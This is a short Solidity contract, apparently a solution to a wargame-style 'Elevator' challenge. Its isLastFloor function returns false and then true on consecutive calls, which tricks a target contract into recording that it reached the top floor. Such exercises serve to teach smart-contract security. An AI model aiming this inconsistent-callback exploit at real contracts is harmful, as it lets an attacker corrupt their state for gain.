//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

interface IElevator {
    function goTo(uint) external;
}

contract ElevatorAttack {
    address public attacker;
    bool public isTop = true;

    modifier onlyAttacker {
        require(msg.sender == attacker, "ElevatorAttack: NOT_OWNER");
        _;
    }

    constructor() {
        attacker = msg.sender;
    }

    function isLastFloor(uint256) external returns (bool) {
        isTop = !isTop;
        return isTop;
    }

    function attack(address _victim) public onlyAttacker {
        IElevator elevatorInstance = IElevator(_victim);
        elevatorInstance.goTo(100);
    }
}
